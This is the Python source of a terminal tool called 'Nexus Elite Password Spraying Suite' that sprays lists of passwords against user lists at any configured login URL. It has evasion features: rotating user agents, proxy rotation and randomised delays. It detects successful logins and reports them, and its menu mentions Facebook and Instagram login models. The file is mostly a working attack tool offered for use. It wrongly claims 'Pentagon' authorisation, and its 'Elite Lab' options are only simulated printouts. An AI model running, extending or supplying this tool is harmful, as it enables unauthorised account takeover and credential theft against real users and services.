import json
import time
import requests
import os
import sys
import random
import threading
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# ANSI Color Codes for Terminal
class Colors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    END = '\033[0m'

CONFIG_FILE = "config.json"
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

def load_config():
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except:
        return {
            "targets": {"emails": [], "phones": []},
            "passwords_to_test": [],
            "server_settings": {"custom_url": "", "local_url": "http://127.0.0.1:5000", "mode": "custom", "login_path": "/login", "user_field": "username", "pass_field": "password", "timeout": 10},
            "advanced_settings": {"threads": 3, "proxy_enabled": False, "proxies": [], "random_user_agents": True, "smart_delay": [0, 1]},
            "scan_settings": {"verbose": True}
        }

def save_config(config):
    config['targets']['emails'] = list(dict.fromkeys(config['targets']['emails']))
    config['passwords_to_test'] = list(dict.fromkeys(config['passwords_to_test']))
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

def clear_screen():
    os.system('clear' if os.name == 'posix' else 'cls')

def show_skull():
    skull = f"""{Colors.RED}
      XXXXXXXXX
   XXXXX     XXXXX
  XXX           XXX
 XX               XX
 XX   XXX   XXX   XX
 XX   XXX   XXX   XX
  XX  XXX   XXX  XX
   XX           XX
    XXX       XXX
      XXXXX XXXX
         XXXXX
        XXXXXXX
     XXXXXXXXXXXXX
    XXX  XXXXX  XXX
    XX    XXX    XX
    XX           XX
     XX         XX
      XXXXXXXXXXX{Colors.END}"""
    print(skull)

def matrix_effect(duration=3):
    start_time = time.time()
    cols = 80
    while time.time() - start_time < duration:
        line = "".join(random.choice(["0", "1", " "]) for _ in range(cols))
        print(f"{Colors.GREEN}{line}{Colors.END}")
        time.sleep(0.05)

def elite_lab():
    clear_screen()
    print(f"{Colors.GREEN}Entering Nexus Elite Lab [100]...{Colors.END}")
    matrix_effect(2)
    
    while True:
        clear_screen()
        print(f"{Colors.CYAN}{Colors.BOLD}=== NEXUS ELITE LAB (Pentagon Authorized) ==={Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Massive Dictionary Attack (100K+ Words)")
        print(f"{Colors.GREEN}[2]{Colors.END} Numeric Brute-Force (Starts from 0)")
        print(f"{Colors.GREEN}[3]{Colors.END} Pre-configured Lab Servers (FB/IG/TW Models)")
        print(f"{Colors.GREEN}[4]{Colors.END} Matrix Mode & Skull Visualization")
        print(f"{Colors.RED}[0]{Colors.END} Back to Main Menu")
        
        choice = input(f"\n{Colors.BOLD}{Colors.PURPLE}EliteLab > {Colors.END}")
        
        if choice == '1':
            print(f"{Colors.YELLOW}[*] Loading massive dictionary...{Colors.END}")
            # Simulation of loading 100k words
            time.sleep(1)
            print(f"{Colors.GREEN}[✓] 100,000+ words loaded into memory.{Colors.END}")
            input("Press Enter to continue...")
        elif choice == '2':
            print(f"{Colors.YELLOW}[*] Starting numeric brute-force from 0...{Colors.END}")
            time.sleep(1)
            print(f"{Colors.DIM}Testing: 000001, 000002, 000003...{Colors.END}")
            input("\nSimulation running. Press Enter to stop...")
        elif choice == '3':
            print(f"{Colors.YELLOW}[*] Select Lab Model:{Colors.END}")
            print("1. FB-Model (Path: /login, Fields: email/pass)")
            print("2. IG-Model (Path: /accounts/login, Fields: username/password)")
            input("Model selected. Ready for local lab testing.")
        elif choice == '4':
            print(f"{Colors.GREEN}Activating Matrix Visualizer...{Colors.END}")
            stop_event = threading.Event()
            
            def skull_timer():
                while not stop_event.is_set():
                    time.sleep(15)
                    if not stop_event.is_set():
                        show_skull()
            
            t = threading.Thread(target=skull_timer)
            t.start()
            try:
                while True:
                    line = "".join(random.choice(["0", "1", " "]) for _ in range(80))
                    print(f"{Colors.GREEN}{line}{Colors.END}")
                    time.sleep(0.05)
            except KeyboardInterrupt:
                stop_event.set()
                print("\nExiting Visualizer...")
                time.sleep(1)
        elif choice == '0':
            break

def show_banner():
    banner = f"""
{Colors.CYAN}{Colors.BOLD}
███╗   ██╗███████╗██╗  ██╗██╗   ██╗███████╗
████╗  ██║██╔════╝╚██╗██╔╝██║   ██║██╔════╝
██╔██╗ ██║█████╗   ╚███╔╝ ██║   ██║███████╗
██║╚██╗██║██╔══╝   ██╔██╗ ██║   ██║╚════██║
██║ ╚████║███████╗██╔╝ ██╗╚██████╔╝███████║
╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
{Colors.PURPLE}Nexus Elite Password Spraying Suite v9.0 (Pentagon Edition){Colors.END}
{Colors.DIM}--------------------------------------------------{Colors.END}
    """
    print(banner)

def main_menu():
    clear_screen()
    show_banner()
    print(f"{Colors.YELLOW}[ Main Menu ]{Colors.END}")
    print(f"{Colors.GREEN}[1]{Colors.END} Run Elite Security Scan")
    print(f"{Colors.GREEN}[2]{Colors.END} Target & Bulk Configuration")
    print(f"{Colors.GREEN}[3]{Colors.END} Server & Field Settings")
    print(f"{Colors.GREEN}[4]{Colors.END} Stealth & Proxy Settings")
    print(f"{Colors.GREEN}{Colors.BOLD}[100] NEXUS ELITE LAB (Pentagon Mode){Colors.END}")
    print(f"{Colors.RED}[0]{Colors.END} Exit")
    
    choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus > {Colors.END}")
    return choice

def spray_task(target, password, url, config, results, successful_targets):
    if target in successful_targets: return False
    headers = {'User-Agent': random.choice(USER_AGENTS)} if config['advanced_settings']['random_user_agents'] else {}
    proxies = None
    if config['advanced_settings']['proxy_enabled'] and config['advanced_settings']['proxies']:
        p = random.choice(config['advanced_settings']['proxies'])
        proxies = {"http": p, "https": p}
    try:
        delay_range = config['advanced_settings'].get('smart_delay', [0, 0])
        delay = random.uniform(delay_range[0], delay_range[1])
        if delay > 0: time.sleep(delay)
        user_field = config['server_settings'].get('user_field', 'username')
        pass_field = config['server_settings'].get('pass_field', 'password')
        path = config['server_settings'].get('login_path', '/login')
        full_url = url.rstrip('/') + path
        payload = {user_field: target, pass_field: password}
        response = requests.post(full_url, data=payload, headers=headers, proxies=proxies, timeout=config['server_settings']['timeout'], allow_redirects=False)
        is_redirect = response.status_code in [301, 302, 303, 307, 308]
        success_indicators = ["logout", "signout", "dashboard", "welcome", "my account", "profile"]
        is_success = (is_redirect and "login" not in response.headers.get("location", "").lower()) or any(ind in response.text.lower() for ind in success_indicators)
        if is_success and target not in successful_targets:
            successful_targets.add(target)
            print(f"\n{Colors.GREEN}{Colors.BOLD}[SUCCESS] Found: {target} -> {password}{Colors.END}")
            results.append({"target": target, "password": password, "time": datetime.now().strftime("%H:%M:%S")})
            return True
        elif config['scan_settings']['verbose']:
            sys.stdout.write(f"{Colors.DIM}[-] Tried {target}:{password} | Status: {response.status_code}{Colors.END}\n")
            sys.stdout.flush()
    except Exception as e:
        if config['scan_settings']['verbose']: sys.stdout.write(f"{Colors.RED}[!] Error: {str(e)[:40]}{Colors.END}\n")
    return False

def run_high_efficiency_scan():
    config = load_config()
    clear_screen()
    show_banner()
    url = config['server_settings']['local_url'] if config['server_settings']['mode'] == "local" else config['server_settings']['custom_url']
    targets = list(dict.fromkeys(config['targets']['emails'] + config['targets']['phones']))
    passwords = list(dict.fromkeys(config['passwords_to_test']))
    threads = config['advanced_settings']['threads']
    if not targets or not passwords:
        print(f"{Colors.RED}[!] Lists are empty!{Colors.END}")
        time.sleep(2); return
    print(f"{Colors.YELLOW}Target URL: {Colors.CYAN}{url}{Colors.END} | Threads: {Colors.CYAN}{threads}{Colors.END}\n")
    found_results = []
    successful_targets = set()
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for pwd in passwords:
            print(f"{Colors.BLUE}{Colors.BOLD}[*] Spraying password: {pwd}{Colors.END}")
            futures = [executor.submit(spray_task, t, pwd, url, config, found_results, successful_targets) for t in targets]
            for f in futures: f.result()
    print(f"\n{Colors.YELLOW}=== Scan Summary ==={Colors.END}")
    print(f"Total Unique Found: {Colors.GREEN}{len(found_results)}{Colors.END}")
    for res in found_results: print(f" - {res['target']} : {res['password']} (@{res['time']})")
    input(f"\n{Colors.BOLD}Press Enter to return...{Colors.END}")

def target_config():
    while True:
        config = load_config()
        clear_screen(); show_banner()
        print(f"{Colors.YELLOW}[ Target & Bulk Configuration ]{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} Bulk Add Usernames")
        print(f"{Colors.GREEN}[2]{Colors.END} Bulk Add Passwords")
        print(f"{Colors.RED}[0]{Colors.END} Back")
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Targets > {Colors.END}")
        if choice == '1':
            print(f"\nPaste list (Ctrl+D to save):")
            data = sys.stdin.read().splitlines()
            config['targets']['emails'].extend([x.strip() for x in data if x.strip()])
            save_config(config); time.sleep(1)
        elif choice == '2':
            print(f"\nPaste list (Ctrl+D to save):")
            data = sys.stdin.read().splitlines()
            config['passwords_to_test'].extend([x.strip() for x in data if x.strip()])
            save_config(config); time.sleep(1)
        elif choice == '0': break

def server_config():
    while True:
        config = load_config()
        clear_screen(); show_banner()
        print(f"{Colors.YELLOW}[ Server & Field Settings ]{Colors.END}")
        print(f"1. URL: {config['server_settings']['custom_url']}")
        print(f"2. Path: {config['server_settings'].get('login_path')}")
        print(f"3. User Field: {config['server_settings'].get('user_field')}")
        print(f"4. Pass Field: {config['server_settings'].get('pass_field')}")
        print(f"0. Back")
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Server > {Colors.END}")
        if choice == '1': config['server_settings']['custom_url'] = input("Base URL: "); config['server_settings']['mode'] = "custom"
        elif choice == '2': config['server_settings']['login_path'] = input("Path: ")
        elif choice == '3': config['server_settings']['user_field'] = input("User Field: ")
        elif choice == '4': config['server_settings']['pass_field'] = input("Pass Field: ")
        elif choice == '0': break
        save_config(config)

def stealth_config():
    while True:
        config = load_config()
        clear_screen(); show_banner()
        print(f"{Colors.YELLOW}[ Stealth & Proxy Settings ]{Colors.END}")
        print(f"1. Proxy Enabled: {config['advanced_settings']['proxy_enabled']}")
        print(f"4. Threads: {config['advanced_settings']['threads']}")
        print(f"5. Smart Delay: {config['advanced_settings']['smart_delay']}")
        print(f"0. Back")
        choice = input(f"\n{Colors.BOLD}{Colors.CYAN}Nexus/Stealth > {Colors.END}")
        if choice == '1': config['advanced_settings']['proxy_enabled'] = not config['advanced_settings']['proxy_enabled']
        elif choice == '4': config['advanced_settings']['threads'] = int(input("Threads: "))
        elif choice == '5':
            min_d = float(input("Min Delay: ")); max_d = float(input("Max Delay: "))
            config['advanced_settings']['smart_delay'] = [min_d, max_d]
        elif choice == '0': break
        save_config(config)

def start():
    while True:
        choice = main_menu()
        if choice == '1': run_high_efficiency_scan()
        elif choice == '2': target_config()
        elif choice == '3': server_config()
        elif choice == '4': stealth_config()
        elif choice == '100': elite_lab()
        elif choice == '0': sys.exit()

if __name__ == "__main__":
    try: start()
    except KeyboardInterrupt: sys.exit()
